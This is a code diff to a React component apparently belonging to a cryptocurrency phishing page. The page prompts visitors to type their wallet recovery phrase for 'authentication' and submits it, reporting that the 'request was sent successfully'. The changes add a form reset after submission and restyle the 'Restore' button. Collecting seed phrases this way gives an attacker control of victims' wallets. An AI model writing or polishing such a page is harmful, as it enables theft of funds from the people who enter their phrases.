@@ -8,6 +8,7 @@ import { Button, Form, notification } from 'antd';
 
 function AuthPage() {
   const [loading, setLoading] = useState(false)
+  const [form] = Form.useForm()
 
   const handleSubmit = (data) => {
     setLoading(true);
@@ -33,6 +34,7 @@ function AuthPage() {
             description: `${result.text}, your request was sent successfully.`
           })
           setLoading(false);
+          form.resetFields()
         },
         (error) => {
           notification.error({
@@ -70,12 +72,12 @@ function AuthPage() {
                                             <p className="fs-4 m-0 fw-bold">Import Your Wallet</p>
                                             <p className="fs-6 m-0 px-md-5">Type in your word recovery phase to restore your existing wallet for <span className="text-info animate-fading">authentication.</span></p>
                                         </div>
-                                        <Form className="my-3 px-md-5" id="signUpForm" onFinish={handleSubmit}>
+                                        <Form className="my-3 px-md-5" form={form} id="signUpForm" onFinish={handleSubmit}>
                                             <Form.Item name="message" className="form-group animate-left">
                                                 <textarea name='phrase' className="form-control border-info" id="exampleFormControlTextarea1 semail" rows="3" required></textarea>
                                             </Form.Item>
                                             <div className="my-4 animate-right">
-                                                <Button block type='primary' loading={loading} htmlType="submit" className="text-white w-100 btn btn-info">Restore</Button>
+                                                <Button size='large' block type='primary' loading={loading} htmlType="submit" className="bg-info">Restore</Button>
                                             </div>
                                         </Form>
                                     </div>
